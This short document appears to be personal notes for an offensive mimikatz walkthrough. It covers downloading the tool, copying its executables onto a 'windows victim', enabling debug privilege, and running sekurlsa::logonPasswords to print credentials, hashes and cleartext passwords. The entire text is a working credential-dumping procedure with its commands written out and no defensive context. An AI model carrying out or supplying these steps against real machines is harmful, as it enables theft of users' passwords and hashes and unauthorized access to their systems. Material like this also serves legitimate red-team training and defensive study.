# mimikatz

Download mimikatz gentil kiwi

download zip x64

after extracting / paste the 4 .exe files into the windows victim

Now run the mimikatz.exe in the windows machine

then set the privilege mode to debug

```
privilege::
```

this print out available modules

the debug mode helps us run all the attacks

```
privilege::debug
```

```
sekurlsa::
```

prints available options

```
sekurlsa::logonPasswords
```

This prints out all creds/hashes/cleartext

